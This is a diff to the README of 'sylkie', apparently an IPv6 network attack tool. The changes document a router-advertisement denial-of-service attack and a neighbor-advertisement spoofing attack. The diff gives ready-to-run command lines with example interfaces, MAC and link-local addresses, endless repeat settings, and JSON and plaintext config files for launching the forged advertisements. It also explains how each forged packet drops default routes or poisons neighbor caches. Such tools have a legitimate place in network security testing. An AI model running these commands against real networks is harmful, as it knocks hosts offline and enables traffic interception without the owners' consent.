@@ -39,13 +39,15 @@ make install
 ## Basic usage
 
 The following describes the basic usage of `sylkie`. Run `sylkie -h` or
-`sylkie <subcommand> -h` for more details.
+`sylkie <subcommand> -h` for more details or check out
+[Advanced Usage](https://github.com/dlrobertson/sylkie/wiki#advanced-usage)
+for more examples.
 
 ### DoS (Router Advert)
 
-The basic usage of the `sylkie` router advert command is listed below.
-This command will send a Router Advertisement message to the given ip
-or the all nodes multicast addres causing the targeted nodes to remove
+The basic usage of the `router-advert` command is listed below. This
+command will send a Router Advertisement message to the given ip or the
+all nodes multicast addres causing the targeted nodes to remove
 `<router-ip>/<prefix>` from their list of default routes.
 
 ```
@@ -75,17 +77,87 @@ all-nodes address `ff02::1` causing all of the nodes to remove
 `fe80::b95b:ee1:cafe:9720/64` (link-layer address `52:54:00:e3:f4:06`)
 from their list of default routes.
 
-That is quite a bit of info. To make life easier `sylkie` also accepts
-json, where the subcommand (`ra`, `na`) is a key whos value is an array
-of objects with the keys and values being the corresponding option
-and value. To run the command, pass the path to the json file as the
-argument to the `-j` option.
+#### How it works
 
-To run the above command from json, first create a file with the following.
+The `router-advert` (`ra`) command attempts to DoS a network by sending
+"forged" Router Advertisement messages to either a targeted address
+(if one is provided) or the link local scope all-nodes address `ff02::1`.
+The "forged" Router Advertisement contains [Prefix Information](https://tools.ietf.org/html/rfc4861#section-4.6.2)
+with the lifetimes set to 0. The message also contains the
+[Source Link-Layer Address](https://tools.ietf.org/html/rfc4861#section-4.6.1).
+This should cause the targeted address or all link local nodes to
+remove the targetted router from the list of default routes.
+
+### Address spoofing (Neighbor Advert)
+
+The basic usage of the sylkie neighbor advert command is listed below.
+This command will send a forged Neighbor Advertisement message to the
+given ip.
+
+```
+sylkie na -i <interface> \
+    --dst-mac <dest hw addr> \
+    --src-ip <source ip> \
+    --dst-ip <dest ip address> \
+    --target-ip <target ip address> \
+    --target-mac <target mac address> \
+    --timeout <time betweeen adverts> \
+    --repeat <number of times to send the request>
+```
+
+#### How it works
+
+The `neighbor-advert` (`na`) command attempts to spoof a given address
+by sending "forged" Neighbor Advertisement message to the targeted address.
+The "forged" Neighbor Advertisement has the [Override Flag](https://tools.ietf.org/html/rfc4861#section-4.4)
+set. This advertisement also contains the necessary
+[Target Link-layer Address](https://tools.ietf.org/html/rfc4861#section-4.6.1)
+information set so that the targeted host does not have to query the
+targeted host for more information before updating the neighbor cache.
+This should cause the targeted host to update the neighbor cache entry
+for the given ip address with the given link-layer address.
+
+#### Neighbor Advert examples
+
+A basic example
+
+```
+sylkie na -i ens3 \
+    --dst-mac 52:54:00:e3:f4:06 \
+    --src-ip fe80::61ad:fda3:3032:f6f4 \
+    --dst-ip fe80::b95b:ee1:cafe:9720 \
+    --target-ip fe80::61ad:fda3:3032:f6f4 \
+    --target-mac 52:54:00:c2:a7:7c \
+    --repeat -1 \
+    --timeout 3
+```
+
+This would send a "forged" Neighbor Advertisement message to `dst-ip`
+(`fe80::b95b:ee1:cafe:9720`), causing the hardware address in the neighbor
+cache for the `target-ip` (`fe80::61ad:fda3:3032:f6f4`) to be updated to
+the `target-mac` (`52:54:00:c2:a7:7c`).
+
+# Saving your work
+
+The commands above require quite a bit of info. To make life easier `sylkie`
+also accepts json and plaintext files containing the necessary info to start
+sending the forged advertisments.
+
+## JSON
+
+The subcommand (`router-advert`, `neighbor-advert`) is a key whos
+value is an array of objects with the keys and values being the
+corresponding option and value. To run the command, pass the
+path to the json file as the argument to the `-j` option.
+
+### Example
+
+To run the `router-advert` example provided above from json, first create
+a file with the following.
 
 ```
 {
-    "ra": [
+    "router-advert": [
         {
             "interface": "ens3",
             "target-mac": "52:54:00:e3:f4:06",
@@ -104,54 +176,22 @@ After creating the file, start sending adverts with the following.
 sylkie -j /path/to/json
 ```
 
-This becomes especially useful if there is a set of advertisements
-that need to be configured and sent. For example, the following json
-config would send two router advertisements on the configured
-intervals.
+## Plaintext
+
+Each line of the file must be exactly what you would provide via
+the command line minus the `sylkie` command.
+
+### Example
+
+To run the `neighbor-advert` example provided above from json, first create
+a file with the following.
 
 ```
-{
-    "ra": [
-        {
-            "interface": "ens3",
-            "target-mac": "52:54:00:e3:f4:06",
-            "router-ip": "fe80::b95b:ee1:cafe:9720",
-            "prefix": 64,
-            "repeat": -1,
-            "timeout": 10
-        },
-        {
-            "interface": "ens3",
-            "target-mac": "52:54:00:c2:a7:7c",
-            "router-ip": "fe80::cbed:6822:cd23:bbdb",
-            "prefix": 64,
-            "repeat": -1,
-            "timeout": 10
-        }
-    ]
-}
+na -i ens3 --dst-mac 52:54:00:e3:f4:06 --src-ip fe80::61ad:fda3:3032:f6f4 --dst-ip fe80::b95b:ee1:cafe:9720 --target-ip fe80::61ad:fda3:3032:f6f4 --target-mac 52:54:00:c2:a7:7c --repeat -1 --timeout 3
 ```
 
-#### How it works
-
-The router advert (`ra`) command attempts to DoS a network by sending
-"forged" Router Advertisement messages to either a targeted address
-(if one is provided) or the link local scope all-nodes address `ff02::1`.
-The "forged" Router Advertisement contains [Prefix Information](https://tools.ietf.org/html/rfc4861#section-4.6.2)
-with the lifetimes set to 0. The message also contains the
-[Source Link-Layer Address](https://tools.ietf.org/html/rfc4861#section-4.6.1).
-This should cause the targeted address or all link local nodes to
-remove the targetted router from the list of default routes.
-
-### Address spoofing (Neighbor Advert)
+After creating the file, start sending the adverts with
 
 ```
-sylkie na -i <interface> \
-    --dst-mac <dest hw addr> \
-    --src-ip <source ip> \
-    --dst-ip <dest ip address> \
-    --target-ip <target ip address> \
-    --target-mac <target mac address> \
-    --timeout <time betweeen adverts> \
-    --repeat <number of times to send the request>
+sylkie -x /path/to/file
 ```
